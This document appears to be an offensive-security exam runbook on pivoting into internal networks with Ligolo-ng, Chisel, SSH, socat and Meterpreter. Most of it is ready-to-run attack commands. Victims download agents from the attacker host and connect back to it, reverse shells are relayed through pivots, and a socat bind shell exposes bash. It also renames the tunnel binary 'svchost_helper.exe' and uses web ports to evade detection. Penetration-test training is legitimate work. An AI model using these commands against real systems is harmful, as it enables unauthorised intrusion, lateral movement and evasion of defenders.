# Network Pivoting Runbook

Pivoting = reaching network segments you cannot access directly from Kali. On the OSEP exam you will always encounter at least one internal segment behind a compromised host. This is non-negotiable knowledge.

---

## The Mental Model

```
Kali (192.168.45.202)
  │ can reach
  └─► Victim1 / Pivot (192.168.45.10 | 172.16.1.5)
                │ can reach (you cannot, directly)
                └─► Internal Target (172.16.1.100)
```

You need to route traffic from Kali → Victim1 → Target. Three tools cover 99% of OSEP scenarios:

| Tool | How it works | Best for |
|------|-------------|----------|
| **Ligolo-ng** | Real TUN interface on Kali | Everything — no proxychains needed |
| **Chisel** | SOCKS5 proxy over HTTP | Firewalled environments, Windows without admin |
| **SSH** | Built-in port forwarding | When you have SSH credentials to pivot host |
| **Socat** | TCP relay | Quick port-specific forwards on Linux pivots |

**Ligolo-ng is preferred.** Use Chisel when Ligolo won't work.

---

## Tool 1: Ligolo-ng (Preferred)

Ligolo-ng creates a real TUN network interface on Kali. Once set up, you can directly reach internal hosts **without proxychains** — run nmap, crackmapexec, evil-winrm, xfreerdp exactly as if you were on the same network.

### One-time setup on Kali (do this at the start of every exam)

```bash
# Create the TUN interface (survives reboots if you redo this)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start the proxy (listens for agent connections)
# -selfcert = auto-generate TLS cert, no config needed
./proxy -selfcert -laddr 0.0.0.0:11601
```

### On the Windows victim

```powershell
# Download the agent
(New-Object System.Net.WebClient).DownloadFile("http://192.168.45.202/agent.exe", "C:\Windows\Temp\agent.exe")

# Run it - connects back to your proxy
C:\Windows\Temp\agent.exe -connect 192.168.45.202:11601 -ignore-cert
```

### On a Linux victim

```bash
wget http://192.168.45.202/agent -O /tmp/agent && chmod +x /tmp/agent
/tmp/agent -connect 192.168.45.202:11601 -ignore-cert
```

### In the Ligolo-ng proxy console (on Kali)

```
# List connected agents
session

# Select a session (type its number, press Enter)
1

# Start the tunnel
start
```

### Add routes so Kali can reach internal subnets

```bash
# After starting the tunnel in the proxy console:
sudo ip route add 172.16.1.0/24 dev ligolo
sudo ip route add 10.10.10.0/24 dev ligolo

# Confirm
ip route show | grep ligolo

# Now reach internal hosts directly — no proxychains:
nmap -sV -p 80,443,445,3389 172.16.1.100
crackmapexec smb 172.16.1.0/24 -u admin -p Password1
xfreerdp /v:172.16.1.100 /u:admin /p:Password1
evil-winrm -i 172.16.1.100 -u admin -p Password1
```

### Getting reverse shells BACK through Ligolo (critical)

When you spawn a payload on an internal host, it can't reach Kali directly. Use a Ligolo **listener** so the internal host connects back through the pivot.

In the proxy console (session selected, tunnel running):
```
# Add listener: internal hosts connect to pivot:4444, which routes to Kali:4444
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Set your payload LHOST = the pivot's internal IP (172.16.1.5), LPORT = 4444
# Start msfconsole listener on Kali:4444
# Internal host payload connects to 172.16.1.5:4444 → arrives at Kali:4444
```

### Clean up

```bash
sudo ip route del 172.16.1.0/24 dev ligolo
sudo ip link set ligolo down
sudo ip tuntap del ligolo mode tun
```

---

## Tool 2: Chisel (SOCKS5 Proxy)

Chisel tunnels a SOCKS5 proxy over HTTP. Useful when you can't run Ligolo (restrictive firewall, no TUN support, specific HTTP egress only).

**Limitation:** Requires proxychains for most tools. Some tools (raw sockets, ICMP) won't work through SOCKS.

### Download and serve

```bash
# Kali - download both binaries
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && mv chisel_linux_amd64 chisel && chmod +x chisel

# Windows binary - rename to something innocent
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_windows_amd64.gz
gunzip chisel_windows_amd64.gz && mv chisel_windows_amd64.exe svchost_helper.exe

# Serve them
python3 -m http.server 80
```

### SOCKS5 Reverse Proxy (standard setup)

**Kali (server):**
```bash
./chisel server --reverse --port 8080 --socks5
# Creates SOCKS5 listener on Kali:1080 when a client connects
```

**Windows victim (client — connects BACK to Kali):**
```powershell
# Download and run
(New-Object System.Net.WebClient).DownloadFile("http://192.168.45.202/svchost_helper.exe","C:\Windows\Temp\svchost_helper.exe")
C:\Windows\Temp\svchost_helper.exe client 192.168.45.202:8080 R:socks
```

**Linux victim:**
```bash
./chisel client 192.168.45.202:8080 R:socks
```

After this, Kali's `127.0.0.1:1080` is a SOCKS5 proxy that routes through the victim.

### proxychains configuration

Edit `/etc/proxychains4.conf`:
```ini
[ProxyList]
socks5  127.0.0.1 1080
```

Use it:
```bash
proxychains nmap -sT -Pn -p 22,80,443,445,3389 172.16.1.0/24   # TCP only, -Pn required
proxychains crackmapexec smb 172.16.1.0/24 -u admin -p Pass123
proxychains evil-winrm -i 172.16.1.100 -u admin -p Pass123
proxychains xfreerdp /v:172.16.1.100 /u:admin /p:Pass123
proxychains impacket-psexec admin:Pass123@172.16.1.100
proxychains python3 exploit.py
```

### Specific port forward (not SOCKS)

```bash
# Kali - forward Kali:3390 → victim → 172.16.1.5:3389 (RDP)
./chisel server --reverse --port 8080
# Victim:
.\svchost_helper.exe client 192.168.45.202:8080 R:3390:172.16.1.5:3389
# Kali:
xfreerdp /v:127.0.0.1:3390 /u:admin /p:Pass123
```

### Run Chisel on port 80/443 to blend with web traffic

```bash
./chisel server --reverse --port 443 --socks5
.\svchost_helper.exe client 192.168.45.202:443 R:socks
```

---

## Tool 3: Double Pivot (Two Hops with Chisel)

```
Kali ──► Victim1 (internet-facing) ──► Victim2 (internal only) ──► Target
         192.168.45.10                  172.16.1.20                 10.10.10.100
         172.16.1.5
```

### Hop 1: Kali ↔ Victim1 (standard)

```bash
# Kali:
./chisel server --reverse --port 8080 --socks5
# Victim1:
.\chisel.exe client 192.168.45.202:8080 R:socks
# Kali now has SOCKS5 at :1080 → reaches 172.16.1.0/24
```

### Hop 2: Victim1 ↔ Victim2

On Victim1, run a second Chisel **server** for Victim2 to connect to:
```powershell
# Victim1 (from your session on Victim1, via proxychains from Kali)
.\chisel.exe server --reverse --port 9001 --socks5
```

On Victim2 (drop chisel there via proxychains upload):
```powershell
.\chisel.exe client 172.16.1.5:9001 R:1081:socks
# Creates SOCKS on Victim1 at :1081
```

Then forward that port back to Kali via the Hop 1 tunnel:
```powershell
# Additional forward from Victim1 back to Kali
.\chisel.exe client 192.168.45.202:8080 R:1081:127.0.0.1:1081
```

Now Kali has:
- `:1080` → reaches `172.16.1.0/24` (via Victim1)
- `:1081` → reaches `10.10.10.0/24` (via Victim1 → Victim2)

```bash
# Use hop-2 config
cat > /etc/proxychains-hop2.conf << 'EOF'
[ProxyList]
socks5  127.0.0.1 1081
EOF

proxychains -f /etc/proxychains-hop2.conf nmap -sT -Pn 10.10.10.100
```

---

## Tool 4: SSH Port Forwarding

Use when you have SSH credentials to the pivot host.

### Dynamic SOCKS proxy (most useful)

```bash
# Creates SOCKS5 at Kali:1080 tunneled over SSH through pivot
ssh -D 1080 -N -f user@pivot_host

# Background flag (-f), no shell (-N)
# Then use with proxychains as above
```

### Local port forward (-L): specific port on Kali → internal host

```bash
# Kali:3390 → pivot → internal-rdp-host:3389
ssh -L 3390:10.10.10.5:3389 -N -f user@pivot_host
xfreerdp /v:127.0.0.1:3390 /u:admin /p:Pass123

# Kali:8080 → pivot → internal web server:80
ssh -L 8080:10.10.10.10:80 -N -f user@pivot_host
curl http://127.0.0.1:8080/
```

### Remote port forward (-R): victim has SSH, opens tunnel TO Kali

```bash
# Run this ON the victim (it SSH's out to Kali)
# Victim's port 3389 appears as Kali:3390
ssh -R 3390:127.0.0.1:3389 -N -f kaliuser@192.168.45.202
```

### Jump host (-J): direct connection through SSH hop

```bash
# Single hop
ssh -J user@pivot_host user@internal_host

# With SOCKS through jump host
ssh -J user@pivot_host -D 1080 -N user@internal_host

# Two hops
ssh -J user@pivot1,user@pivot2 user@final_target
```

### SSH persistent config (~/.ssh/config)

```
Host pivot
    HostName 192.168.45.10
    User pentester
    DynamicForward 1080
    ServerAliveInterval 30
    ServerAliveCountMax 3

# Then: ssh -N pivot
```

---

## Tool 5: Socat (Linux pivots, quick relay)

### TCP relay (forward specific port through a Linux pivot)

```bash
# On the pivot host (Linux):
# All traffic to pivot:4444 gets forwarded to Kali:4444
socat TCP-LISTEN:4444,fork TCP:192.168.45.202:4444

# Your payload on internal hosts sets LHOST=pivot_internal_ip, LPORT=4444
# Kali catches it on :4444
```

### Relay to an internal host

```bash
# On pivot: forward pivot:8080 → internal web server:80
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80
```

### Transfer Chisel/agent binary through socat

```bash
# Kali (sender):
socat -u FILE:agent.exe TCP-LISTEN:9090,reuseaddr

# Pivot (receiver):
socat -u TCP:192.168.45.202:9090 FILE:/tmp/agent.exe,create
```

### Bind shell

```bash
# Victim (Linux): bind shell on :5555
socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash
# Kali: connect
socat - TCP:victim_ip:5555
```

---

## Meterpreter Routes (Without Ligolo/Chisel)

When you only have a meterpreter session — no binary drop possible. Slower than Ligolo but sometimes the only option.

### Add a route through a meterpreter session

```
meterpreter> background       # or Ctrl+Z
msf> route add 172.16.1.0/24 <session_id>
msf> route print
```

Now modules run through that session automatically. But most tools outside MSF won't use this route — use `socks` plugin for that.

### SOCKS proxy through meterpreter

```
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> set VERSION 5
msf> set SESSION <session_id>
msf> run -j
```

Then configure proxychains with `:1080` as before.

### Port forward specific port (portfwd)

```
meterpreter> portfwd add -l 3390 -p 3389 -r 172.16.1.5
# Kali:3390 → meterpreter → 172.16.1.5:3389
xfreerdp /v:127.0.0.1:3390 /u:admin /p:Pass123

meterpreter> portfwd list
meterpreter> portfwd delete -l 3390
```

**Meterpreter route limitations:**
- MSF modules can use routes natively
- Other tools need the SOCKS proxy module
- Slow compared to Ligolo/Chisel
- Session dies = tunnel dies

---

## Exam Decision Tree

```
I need to reach an internal network...
│
├── Do I have a meterpreter session on a pivot?
│   ├── Yes, and I can drop files → Use Ligolo-ng (preferred)
│   ├── Yes, and I CAN'T drop files → meterpreter route + socks_proxy module
│   └── Yes, but firewalled (only HTTP out) → Chisel on port 80/443
│
├── Do I have SSH credentials to the pivot?
│   └── Yes → ssh -D 1080 + proxychains
│
├── Do I have a shell (not meterpreter) on a Linux pivot?
│   └── Yes → socat relay or curl chisel down
│
└── Need TWO hops?
    └── Chisel nested (server on Hop1, client from Hop2 back)
        or Ligolo-ng (add route per subnet, handles multi-hop cleanly)
```

---

## Quick Reference Cheatsheet

```bash
# Ligolo — setup
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# victim: agent.exe -connect KALI:11601 -ignore-cert
# proxy console: session → 1 → start
sudo ip route add 172.16.1.0/24 dev ligolo

# Chisel — reverse SOCKS
./chisel server --reverse --port 8080 --socks5
# victim: chisel.exe client KALI:8080 R:socks
# proxychains → :1080

# SSH — dynamic SOCKS
ssh -D 1080 -N -f user@pivot

# Socat — relay
socat TCP-LISTEN:4444,fork TCP:KALI:4444

# Meterpreter
route add SUBNET/MASK SESSION_ID
use auxiliary/server/socks_proxy; set SESSION x; run -j
portfwd add -l LOCAL_PORT -p REMOTE_PORT -r REMOTE_IP
```
